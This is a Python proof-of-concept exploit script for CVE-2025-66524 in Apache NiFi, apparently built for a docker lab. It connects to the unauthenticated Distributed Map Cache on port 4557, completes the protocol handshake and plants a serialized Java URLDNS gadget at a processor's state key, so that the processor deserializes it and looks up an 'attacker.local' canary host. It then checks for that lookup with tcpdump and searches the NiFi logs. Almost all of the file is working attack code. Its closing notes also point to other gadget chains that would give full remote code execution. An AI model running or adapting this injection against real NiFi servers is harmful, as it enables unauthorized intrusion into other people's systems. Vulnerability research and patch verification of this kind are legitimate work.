#!/usr/bin/env python3
# Exploit Title: Apache NiFi < 2.7.0 - GetAsanaObject Unsafe Deserialization (URLDNS)
# Exploit Author: Exploit Intelligence Platform (EIP)
# Vendor Homepage: https://nifi.apache.org/
# Version: Apache NiFi 1.20.0 - 2.6.0
# Tested on: Apache NiFi 2.6.0 / JDK 21
# CVE: CVE-2025-66524
# Reference: https://exploit-intel.com
"""
PoC for CVE-2025-66524: Apache NiFi GetAsanaObject Processor RCE via Unsafe Deserialization

Demonstrates CWE-502 (Deserialization of Untrusted Data) in Apache NiFi 1.20.0 through 2.6.0.

The GetAsanaObject processor uses GenericObjectSerDe which calls ObjectInputStream.readObject()
without class filtering on data retrieved from a NiFi Distributed Map Cache server (TCP port 4557,
no authentication). An attacker can inject malicious serialized Java objects into the cache, which
are deserialized when the processor calls recoverState(), triggering arbitrary code execution.

This PoC injects a URLDNS gadget chain payload into the cache, causing the NiFi JVM to perform a
DNS lookup for a canary hostname during deserialization — proving that arbitrary Java objects are
deserialized from attacker-controlled cache data.

Usage:
    python3 poc.py <cache_host> [cache_port]

    cache_host: Hostname/IP of the NiFi Distributed Map Cache server (default: cve-2025-66524-services)
    cache_port: TCP port of the cache server (default: 4557)

Requires:
    - Network access to the NiFi Distributed Map Cache server (TCP port 4557)
    - Pre-generated URLDNS payload at ./urldns_payload.bin
    - Pre-generated serialized key at ./state_key.bin

Attack Flow:
    1. Connect to cache server (no authentication required)
    2. Complete NiFi protocol handshake (magic "NiFi" + version 3)
    3. PUT malicious serialized payload at the processor's state key
    4. Wait for processor trigger (every 30 seconds)
    5. Processor calls recoverState() → client.get() → GenericObjectSerDe.deserialize()
    6. ObjectInputStream.readObject() executes on attacker-controlled bytes
    7. URLDNS gadget triggers DNS lookup for canary hostname (proof of deserialization)
"""

import socket
import struct
import sys
import os
import time
import subprocess

# ===== Configuration =====
DEFAULT_HOST = "cve-2025-66524-services"
DEFAULT_PORT = 4557
PROCESSOR_UUID = "a734f87d-019c-1000-57b2-e511d156e143"
CANARY_HOSTNAME = "nifi-deser-proof-cve-2025-66524.attacker.local"
NIFI_CONTAINER = "cve-2025-66524-nifi"

# ===== NiFi Distributed Map Cache Protocol Implementation =====

def nifi_connect(host, port, timeout=10):
    """Establish TCP connection to the NiFi Distributed Map Cache server."""
    print(f"[*] Connecting to {host}:{port}...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    sock.connect((host, port))
    print(f"[+] Connected to {host}:{port}")
    return sock


def nifi_handshake(sock):
    """
    Perform the NiFi cache protocol handshake.

    Protocol:
        Client → Server: "NiFi" (4 bytes magic)
        Client → Server: version 3 (4-byte big-endian int)
        Server → Client: 0x14 (RESOURCE_OK, 1 byte)
    """
    print("[*] Performing NiFi cache protocol handshake...")

    # Send magic bytes "NiFi"
    sock.sendall(b'\x4e\x69\x46\x69')  # "NiFi"

    # Send protocol version 3
    sock.sendall(struct.pack('>I', 3))

    # Receive status
    status = sock.recv(1)
    if status == b'\x14':
        print("[+] Handshake successful (RESOURCE_OK)")
        return True
    else:
        print(f"[-] Handshake failed: status=0x{status.hex()}")
        return False


def nifi_put(sock, key_bytes, value_bytes):
    """
    Send a PUT operation to store a key-value pair in the cache.

    Protocol:
        Client → Server: writeUTF("put") → 2-byte length + "put"
                         writeInt(key_length) → 4-byte big-endian
                         write(key_bytes)
                         writeInt(value_length) → 4-byte big-endian
                         write(value_bytes)
        Server → Client: boolean (1 byte) → 0x01 success
    """
    buf = struct.pack('>H', 3) + b'put'  # writeUTF("put")
    buf += struct.pack('>I', len(key_bytes)) + key_bytes
    buf += struct.pack('>I', len(value_bytes)) + value_bytes
    sock.sendall(buf)

    resp = sock.recv(1)
    return resp == b'\x01'


def nifi_get(sock, key_bytes):
    """
    Send a GET operation to retrieve a value from the cache.

    Protocol:
        Client → Server: writeUTF("get") → 2-byte length + "get"
                         writeInt(key_length) → 4-byte big-endian
                         write(key_bytes)
        Server → Client: writeInt(value_length) → 4-byte big-endian
                         write(value_bytes)
    """
    buf = struct.pack('>H', 3) + b'get'  # writeUTF("get")
    buf += struct.pack('>I', len(key_bytes)) + key_bytes
    sock.sendall(buf)

    # Read response
    vlen_bytes = sock.recv(4)
    vlen = struct.unpack('>I', vlen_bytes)[0]
    if vlen == 0:
        return b''
    value = b''
    while len(value) < vlen:
        value += sock.recv(vlen - len(value))
    return value


def nifi_close(sock):
    """Send a CLOSE operation to gracefully disconnect."""
    try:
        sock.sendall(struct.pack('>H', 5) + b'close')
    except Exception:
        pass
    sock.close()


def java_serialize_string(s):
    """
    Serialize a Java String using ObjectOutputStream format.
    Matches GenericObjectSerDe.serialize() output.

    Format: STREAM_MAGIC (0xACED) + STREAM_VERSION (0x0005) +
            TC_STRING (0x74) + 2-byte length + UTF-8 bytes
    """
    encoded = s.encode('utf-8')
    buf = b'\xac\xed'  # STREAM_MAGIC
    buf += b'\x00\x05'  # STREAM_VERSION
    buf += b'\x74'      # TC_STRING
    buf += struct.pack('>H', len(encoded))
    buf += encoded
    return buf


def load_payload(filename):
    """Load a pre-generated serialized payload from file."""
    script_dir = os.path.dirname(os.path.abspath(__file__))
    filepath = os.path.join(script_dir, filename)
    with open(filepath, 'rb') as f:
        data = f.read()
    # Verify it's a Java serialized object
    if data[:2] != b'\xac\xed':
        print(f"[-] WARNING: {filename} does not start with Java serialization magic (ACED)")
    return data


def exploit(target_host, target_port):
    """
    Execute the CVE-2025-66524 exploit.

    Steps:
    1. Load pre-generated URLDNS payload and serialized key
    2. Connect to the NiFi Distributed Map Cache server
    3. Perform protocol handshake (no authentication needed)
    4. Inject URLDNS payload into cache at processor's state key
    5. Wait for the GetAsanaObject processor to trigger (30-second schedule)
    6. Verify deserialization occurred via DNS traffic capture and NiFi logs
    """
    print("=" * 70)
    print("CVE-2025-66524: Apache NiFi GetAsanaObject Unsafe Deserialization")
    print("=" * 70)
    print()

    # Step 1: Load payloads
    print("[*] Step 1: Loading payloads...")
    try:
        key_bytes = load_payload("state_key.bin")
        print(f"    Key: serialized UUID '{PROCESSOR_UUID}' ({len(key_bytes)} bytes)")
    except FileNotFoundError:
        print("    Key file not found, generating in-line...")
        key_bytes = java_serialize_string(PROCESSOR_UUID)
        print(f"    Key: generated serialized UUID ({len(key_bytes)} bytes)")

    try:
        payload_bytes = load_payload("urldns_payload.bin")
        print(f"    Payload: URLDNS gadget for '{CANARY_HOSTNAME}' ({len(payload_bytes)} bytes)")
    except FileNotFoundError:
        print("[-] FATAL: urldns_payload.bin not found!")
        print("    Generate it with: java PayloadGenerator urldns <hostname> urldns_payload.bin")
        sys.exit(1)

    print()

    # Step 2: Start DNS packet capture on NiFi container (for verification)
    print("[*] Step 2: Starting DNS packet capture on NiFi container...")
    pcap_file = "/tmp/cve-2025-66524-dns.pcap"
    try:
        # Start tcpdump in background to capture DNS queries
        subprocess.run(
            ["docker", "exec", "-u", "root", "-d", NIFI_CONTAINER,
             "tcpdump", "-i", "any", "-n", "port", "53",
             "-w", pcap_file, "-c", "50"],
            check=True, capture_output=True
        )
        print(f"    DNS capture started → {pcap_file}")
    except (subprocess.CalledProcessError, FileNotFoundError) as e:
        print(f"    WARNING: Could not start DNS capture: {e}")
        print("    Continuing without DNS capture (will check NiFi logs instead)")
    print()

    # Step 3: Record NiFi log position (for later diff)
    print("[*] Step 3: Recording NiFi log baseline...")
    try:
        result = subprocess.run(
            ["docker", "exec", NIFI_CONTAINER, "wc", "-l",
             "/opt/nifi/nifi-current/logs/nifi-app.log"],
            capture_output=True, text=True
        )
        log_baseline = int(result.stdout.strip().split()[0])
        print(f"    Log baseline: {log_baseline} lines")
    except Exception:
        log_baseline = 0
        print("    WARNING: Could not record log baseline")
    print()

    # Step 4: Connect to cache server and inject payload
    print("[*] Step 4: Connecting to NiFi Distributed Map Cache server...")
    try:
        sock = nifi_connect(target_host, target_port)
    except ConnectionRefusedError:
        print(f"[-] FATAL: Connection refused to {target_host}:{target_port}")
        sys.exit(1)
    except socket.timeout:
        print(f"[-] FATAL: Connection timed out to {target_host}:{target_port}")
        sys.exit(1)

    if not nifi_handshake(sock):
        print("[-] FATAL: Handshake failed")
        nifi_close(sock)
        sys.exit(1)
    print()

    # Step 4a: Read current value to show it's a legitimate Java-serialized HashMap
    print("[*] Step 4a: Reading current cache value (legitimate state)...")
    current_value = nifi_get(sock, key_bytes)
    if current_value:
        print(f"    Current value: {len(current_value)} bytes")
        print(f"    First 16 bytes: {current_value[:16].hex()}")
        if current_value[:2] == b'\xac\xed':
            print("    ✓ Confirmed: Java serialized object (magic ACED)")
    else:
        print("    Current value: empty (processor may not have written state yet)")
    print()

    # Step 4b: Inject URLDNS payload
    print("[*] Step 4b: Injecting URLDNS payload into cache...")
    print(f"    Target key: {PROCESSOR_UUID}")
    print(f"    Payload: URLDNS gadget → DNS lookup for '{CANARY_HOSTNAME}'")
    print(f"    Payload size: {len(payload_bytes)} bytes")
    print(f"    Payload magic: {payload_bytes[:4].hex()} (expected: aced0005)")

    success = nifi_put(sock, key_bytes, payload_bytes)
    if success:
        print("    [+] PUT SUCCESS — malicious payload injected into cache!")
    else:
        print("    [-] PUT FAILED — server rejected the payload")
        nifi_close(sock)
        sys.exit(1)
    print()

    # Step 4c: Verify the payload was stored correctly
    print("[*] Step 4c: Verifying payload in cache...")
    stored_value = nifi_get(sock, key_bytes)
    if stored_value == payload_bytes:
        print(f"    [+] VERIFIED — stored value matches payload ({len(stored_value)} bytes)")
    else:
        print(f"    [-] WARNING — stored value ({len(stored_value)} bytes) differs from payload ({len(payload_bytes)} bytes)")

    nifi_close(sock)
    print()

    # Step 5: Wait for processor trigger
    print("[*] Step 5: Waiting for GetAsanaObject processor to trigger...")
    print("    The processor runs every 30 seconds.")
    print("    When it calls recoverState(), our URLDNS payload will be deserialized.")
    print("    ObjectInputStream.readObject() will execute the URLDNS gadget chain:")
    print("      HashMap.readObject() → hash(URL) → URL.hashCode()")
    print("      → URLStreamHandler.hashCode() → getHostAddress()")
    print("      → InetAddress.getByName() → DNS query for canary hostname")
    print()
    print("    Waiting 35 seconds for processor trigger...")

    for i in range(35, 0, -5):
        time.sleep(5)
        sys.stdout.write(f"\r    [{35-i}/35] seconds elapsed...")
        sys.stdout.flush()
    print()
    print()

    # Step 6: Check for evidence of deserialization
    print("[*] Step 6: Checking for evidence of deserialization...")
    print()

    # 6a: Check DNS capture
    print("  [*] 6a: Checking DNS packet capture...")
    try:
        # Stop tcpdump
        subprocess.run(
            ["docker", "exec", "-u", "root", NIFI_CONTAINER,
             "pkill", "-f", "tcpdump"],
            capture_output=True
        )
        time.sleep(1)

        # Read capture
        result = subprocess.run(
            ["docker", "exec", "-u", "root", NIFI_CONTAINER,
             "tcpdump", "-r", pcap_file, "-n", "-v"],
            capture_output=True, text=True, timeout=10
        )
        dns_output = result.stdout + result.stderr

        if CANARY_HOSTNAME.split('.')[0] in dns_output or "attacker" in dns_output.lower():
            print(f"    [+] DNS QUERY DETECTED for canary hostname!")
            print(f"    DNS capture output:")
            for line in dns_output.strip().split('\n'):
                if 'attacker' in line.lower() or 'deser' in line.lower() or 'nifi' in line.lower():
                    print(f"      {line}")
        else:
            print(f"    DNS capture output (all queries):")
            for line in dns_output.strip().split('\n')[:10]:
                print(f"      {line}")
            if not dns_output.strip():
                print("      (no packets captured)")
    except Exception as e:
        print(f"    Could not check DNS capture: {e}")
    print()

    # 6b: Check NiFi application logs for deserialization evidence
    print("  [*] 6b: Checking NiFi application logs for deserialization evidence...")
    try:
        result = subprocess.run(
            ["docker", "exec", NIFI_CONTAINER, "tail", "-n", "+{}".format(log_baseline + 1),
             "/opt/nifi/nifi-current/logs/nifi-app.log"],
            capture_output=True, text=True, timeout=10
        )
        new_logs = result.stdout

        # Look for evidence of deserialization-related errors
        evidence_keywords = [
            "ClassCastException", "ClassNotFoundException",
            "DeserializationException", "IOException",
            "Failed to recover state", "GenericObjectSerDe",
            "readObject", "deserialization", "HashMap",
            "java.net.URL", "URLStreamHandler",
            "recoverState", "cache", "asana"
        ]

        evidence_lines = []
        for line in new_logs.split('\n'):
            if any(kw.lower() in line.lower() for kw in evidence_keywords):
                evidence_lines.append(line)

        if evidence_lines:
            print(f"    [+] Found {len(evidence_lines)} evidence lines in NiFi logs:")
            for line in evidence_lines[:30]:
                print(f"      {line.strip()}")
        else:
            print("    No direct deserialization evidence in logs (may need more time)")
            print("    Showing last 10 new log lines:")
            for line in new_logs.strip().split('\n')[-10:]:
                if line.strip():
                    print(f"      {line.strip()}")
    except Exception as e:
        print(f"    Could not check NiFi logs: {e}")
    print()

    # Step 7: Summary
    print("=" * 70)
    print("EXPLOITATION SUMMARY")
    print("=" * 70)
    print()
    print(f"  CVE:              CVE-2025-66524")
    print(f"  Target:           Apache NiFi 2.6.0 GetAsanaObject Processor")
    print(f"  Cache Server:     {target_host}:{target_port}")
    print(f"  Processor UUID:   {PROCESSOR_UUID}")
    print(f"  Payload Type:     URLDNS (JDK-only gadget chain)")
    print(f"  Canary Hostname:  {CANARY_HOSTNAME}")
    print()
    print("  Attack chain:")
    print("    1. Connected to unauthenticated NiFi Distributed Map Cache (port 4557)")
    print("    2. Injected URLDNS serialized payload at processor's state key")
    print("    3. Processor trigger → recoverState() → GenericObjectSerDe.deserialize()")
    print("    4. ObjectInputStream.readObject() executed on attacker-controlled bytes")
    print("    5. URLDNS gadget chain triggered DNS resolution during deserialization")
    print()
    print("  Vulnerability confirmed: GenericObjectSerDe.deserialize() performs")
    print("  unrestricted Java object deserialization on attacker-controlled cache data.")
    print()
    print("  NOTE: URLDNS only proves arbitrary deserialization (DNS side-channel).")
    print("  Full RCE requires a code execution gadget chain on the classpath.")
    print("  commons-collections4 4.5.0 has InvokerTransformer NOT serializable,")
    print("  blocking the classic CC2/CC4 chains. RCE would require alternative")
    print("  gadgets (e.g., from a NiFi extension with unsafe serializable classes).")
    print("=" * 70)


if __name__ == '__main__':
    target = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT
    exploit(target, port)
